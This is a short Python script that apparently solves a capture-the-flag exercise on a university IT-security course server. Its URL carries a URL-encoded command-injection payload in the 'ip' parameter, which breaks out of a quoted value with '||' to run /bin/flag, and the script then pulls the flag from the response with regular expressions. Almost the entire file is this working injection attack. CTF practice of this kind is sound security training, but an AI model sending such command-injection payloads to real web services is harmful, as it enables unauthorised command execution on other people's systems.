import re
import requests

url = 'https://t6.itsec.sec.in.tum.de/api?ip=lol%27%20||%20/bin/flag%20||%20echo%20%27'

if __name__ == '__main__':
    session = requests.Session()
    page = session.get(url)

    rep = re.compile(r'flag{.*?}')
    print(rep.findall(page.text)[0])
    print("Lol")
    match = re.search(r'flag\{[^}]+}', page.text)
    print(match.group(0))
